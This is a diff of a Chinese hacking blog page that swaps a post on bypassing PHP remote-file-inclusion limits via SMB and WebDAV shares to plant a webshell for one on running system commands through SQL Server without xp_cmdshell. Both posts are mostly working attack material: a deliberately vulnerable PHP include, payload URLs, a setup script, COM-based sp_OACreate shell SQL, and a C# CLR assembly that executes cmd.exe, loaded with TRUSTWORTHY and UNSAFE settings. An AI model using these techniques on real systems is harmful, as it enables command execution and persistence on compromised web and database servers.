@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>RFI绕过限制getshell复现 | 九世的博客</title>
+  <title>sql server没xp_cmdshell执行命令 | 九世的博客</title>
   <meta name="keywords" content=" Writing ">
-  <meta name="description" content="RFI绕过限制getshell复现 | 九世的博客">
+  <meta name="description" content="sql server没xp_cmdshell执行命令 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1583,9 +1583,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-RFI绕过限制getshell复现" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-sql-server没xp-cmdshell执行命令" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">RFI绕过限制getshell复现</h1>
+        <h1 class="article-title">sql server没xp_cmdshell执行命令</h1>
     
     <div class="article-meta">
         
@@ -1601,7 +1601,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-05-31 20:49:05">2019-05-31 18:07</time>
+        创建时间:<time class="date" title="更新时间: 2021-01-07 08:42:54">2021-01-07 08:32</time>
         
     </div>
     <div class="article-meta">
@@ -1623,7 +1623,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#操作的来源"><span class="toc-text">操作的来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现操作"><span class="toc-text">复现操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含漏洞总结"><span class="toc-text">文件包含漏洞总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用COM执行命令"><span class="toc-text">利用COM执行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写CLR实现执行命令"><span class="toc-text">编写CLR实现执行命令</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1638,73 +1638,81 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="操作的来源"><a href="#操作的来源" class="headerlink" title="操作的来源"></a>操作的来源</h2><p>在搜东西的时候翻到某篇文章，“RFI绕过限制getshell”。看到了一波奇淫技巧，就复现了一波<br>原文链接：<a href="http://www.freebuf.com/news/203442.html" target="_blank" rel="noopener">RFI绕过URL包含限制getshell</a></p>
-<p><img src="https://s2.ax1x.com/2019/05/31/VlWk1f.png" alt=""></p>
-<p>由于原文有限制，限制如下：</p>
-<pre><code>smb只适用于内网
-windows特性才能直接访问smb
-</code></pre><p>之后我在群里看见某位老哥发了张图：<br>（使用Apache搭建webav也行）<br><img src="https://s2.ax1x.com/2019/05/31/VlWRUA.jpg" alt=""></p>
-<h2 id="复现操作"><a href="#复现操作" class="headerlink" title="复现操作"></a>复现操作</h2><p><b>smb绕过</b><br>环境：</p>
-<pre><code>windows：phpstudy
-Linux：samba,apache
-</code></pre><p>在www目录下创建一个php(废话)</p>
-<pre><code class="php">&lt;?php
-if($_GET[&#39;file&#39;]){
-    $f=$_GET[&#39;file&#39;];
-    include &quot;$f&quot;;
+        <h2 id="利用COM执行命令"><a href="#利用COM执行命令" class="headerlink" title="利用COM执行命令"></a>利用COM执行命令</h2><p>（需要开启Ole Automation Procedures组件）</p>
+<pre><code>declare @luan int,@exec int,@text int,@str varchar(8000);
+exec sp_oacreate &#39;{72C24DD5-D70A-438B-8A42-98424B88AFB8}&#39;,@luan output;
+exec sp_oamethod @luan,&#39;exec&#39;,@exec output,&#39;C:\\Windows\\System32\\cmd.exe /c whoami&#39;;
+exec sp_oamethod @exec, &#39;StdOut&#39;, @text out;
+exec sp_oamethod @text, &#39;readall&#39;, @str out;
+select @str;
+</code></pre><p><img src="https://s3.ax1x.com/2021/01/07/sZs3hd.png" alt=""></p>
+<p>没有开启Ole Automation Procedures，可以用下面的命令开启</p>
+<pre><code>sp_configure &#39;show advanced options&#39;, 1;
+GO
+RECONFIGURE;
+GO
+sp_configure &#39;Ole Automation Procedures&#39;, 1;
+GO
+RECONFIGURE;
+GO
+</code></pre><h2 id="编写CLR实现执行命令"><a href="#编写CLR实现执行命令" class="headerlink" title="编写CLR实现执行命令"></a>编写CLR实现执行命令</h2><p>编写语言：C#<br>Vs创建类库</p>
+<pre><code class="C#">using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System;
+using System.Threading.Tasks;
+
+namespace shellexec
+{
+    public class exec
+    {
+        public static string cmd(string command)
+        {
+            System.Diagnostics.Process pro = new System.Diagnostics.Process();
+            pro.StartInfo.FileName = &quot;cmd.exe&quot;;
+            pro.StartInfo.UseShellExecute = false;
+            pro.StartInfo.RedirectStandardError = true; //标准错误
+            pro.StartInfo.RedirectStandardInput = true; //标准输入
+            pro.StartInfo.RedirectStandardOutput = true; //标准输出
+            pro.StartInfo.CreateNoWindow = true; //是否在新窗口开启进程
+            pro.Start();
+            pro.StandardInput.WriteLine(command + &quot;&amp;&amp;exit&quot;); //命令参数写入
+            pro.StandardInput.AutoFlush = true; //缓冲区自动刷新
+            string output = pro.StandardOutput.ReadToEnd(); //读取执行结果
+            pro.WaitForExit(); //等待执行完成退出
+            pro.Close();
+            return output.ToString();
+        }
+    }
 }
-?&gt;
+
 </code></pre>
-<p>将allow_url_fopen和allow_url_include改为Off，只改allow_url_include为Off也行。因为php.ini默认是这样的<br><img src="https://s2.ax1x.com/2019/05/31/VlWx2V.png" alt=""></p>
-<p>将以下代码保存为sh文件在kali上运行：</p>
-<pre><code class="shell">#/usr/bin/bash
-
-echo &quot;[*] install samba...&quot;
-apt-get install -y samba
-
-echo &quot;[*] setssing smb and setssing smb.conf...&quot;
-mkdir /var/www/html/pub
-chmod 0555 /var/www/html/pub
-chown -R nobody:nogroup /var/www/html/pub
-wget http://192.168.3.92/rfi/smb.conf
-mv smb.conf /etc/samba/
-
-echo &quot;[*] setssing smb.conf success...&quot;
-echo &quot;[*] start samba&quot;
-service smbd start
-</code></pre>
-<p>smb.conf配置文件：</p>
-<pre><code class="shell">[global]
-workgroup=WORKGROUP
-server string=Samba Server
-netbios name=indishell-lab
-security=user
-map to guest=bad user
-name resolve order=bcast host
-dns proxy = no
-bind interfaces only=yes
-
-[ethan]
-path=/var/www/html/pub
-writable=no
-guest ok=yes
-guest only=yes
-read only=yes
-directory mode=0555
-force user=nobody
-</code></pre>
-<p>安装完成后，在windows上输入\&lt;Attack_IP&gt;<br><img src="https://s2.ax1x.com/2019/05/31/VlhDmD.png" alt=""></p>
-<p>在ethan文件夹上放入小马<br><img src="https://s2.ax1x.com/2019/05/31/Vlho7Q.md.png" alt=""></p>
-<p>执行以下payload：</p>
-<pre><code>http://127.0.0.1/rfi/rfi.php?file=\\192.168.241.132\ethan\demo.php
-</code></pre><p><img src="https://s2.ax1x.com/2019/05/31/VlhxnU.png" alt=""></p>
-<p>由于smb，smb里的php不能接受传参。所以只能放大马</p>
-<p><b>apache搭建webav绕过</b><br>前面说到smb绕过有限制，必须在目标机的同个网段或内网里面，目标机必须是windows<br>在Ubuntu下搭建webdav教程：<a href="https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx" target="_blank" rel="noopener">How to create a WebDAV server on Ubuntu and connect it to ONLYOFFICE - ONLYOFFICE</a></p>
-<p>搭建好之后在Linux的文件管理器中输入dav://127.0.0.1/webdav可以看见如下图就代表成功了<br><img src="https://s2.ax1x.com/2019/05/31/Vlqpfe.md.png" alt=""></p>
-<p>执行以下payload：</p>
-<pre><code>http://127.0.0.1/rfi/rfi.php?file=//192.168.241.132//webdav/demo.php
-</code></pre><p><img src="https://s2.ax1x.com/2019/05/31/VlqAmt.md.png" alt=""></p>
-<h2 id="文件包含漏洞总结"><a href="#文件包含漏洞总结" class="headerlink" title="文件包含漏洞总结"></a>文件包含漏洞总结</h2><p>如图：<br><img src="https://s2.ax1x.com/2019/05/31/VlLxRe.md.png" alt=""></p>
+<p>生成dll后，可以用hex的方法写到目标，或者shell上传。然后开始构造<br>1.目标数据库实例需要启用clr集成</p>
+<pre><code>exec sp_configure &#39;clr enabled&#39;, 1;--在SQL Server中启用CLR
+reconfigure;
+go
+</code></pre><p>2.目标数据库的可信任属性需要设为false,可以使用以下语句启用</p>
+<pre><code>ALTER DATABASE [&lt;数据库名称&gt;] SET TRUSTWORTHY ON
+</code></pre><p>3.在数据库中注册DLL</p>
+<pre><code>CREATE ASSEMBLY MySqlCLR FROM &#39;&lt;dll的路径&gt;&#39; //MySqlCLR为导入dll后的变量名称
+</code></pre><p>4.创建函数<br>（根据对应函数的类型的参数构造对应的参数类型，然后RETURNS [nvarchar] (max)记得设置为返回最大如果是返回string类型的话），在直接这个dll的名称在那个命名空间、类、函数）</p>
+<pre><code>CREATE FUNCTION [dbo].[cmd2]  
+(  
+    @cmd AS NVARCHAR(max)
+)  
+RETURNS [nvarchar] (max) WITH EXECUTE AS CALLER
+AS  
+EXTERNAL NAME [MySqlCLR].[shellexec.exec].cmd //shellexec为命名空间，exec为类名，cmd为函数名
+GO
+</code></pre><p>5.程序集的权限级别必须设为 external access,否则在部署的时候会报错</p>
+<pre><code>ALTER ASSEMBLY [MySqlCLR]
+WITH PERMISSION_SET = UNSAFE
+</code></pre><p>6.调用存储过程和函数方法</p>
+<pre><code>select [dbo].[cmd2](&#39;whoami&#39;)
+</code></pre><p><img src="https://s3.ax1x.com/2021/01/07/sZs6cq.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/01/07/sZsWHU.png" alt=""></p>
+<p>参考链接：<br><a href="https://blog.csdn.net/catchme_439/article/details/78411009" target="_blank" rel="noopener">https://blog.csdn.net/catchme_439/article/details/78411009</a><br><a href="https://zhuanlan.zhihu.com/p/33322584?from_voters_page=true" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33322584?from_voters_page=true</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1714,12 +1722,12 @@ force user=nobody
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>RFI绕过限制getshell复现</p>
+    <p><span class="copy-title">文章标题:</span>sql server没xp_cmdshell执行命令</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-05-31, 18:07:22</p>
-    <p><span class="copy-title">最后更新:</span>2019-05-31, 20:49:05</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9b6dafa5.html" title="RFI绕过限制getshell复现">http://422926799.github.io/posts/9b6dafa5.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-01-07, 08:32:40</p>
+    <p><span class="copy-title">最后更新:</span>2021-01-07, 08:42:54</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/639a5410.html" title="sql server没xp_cmdshell执行命令">http://422926799.github.io/posts/639a5410.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
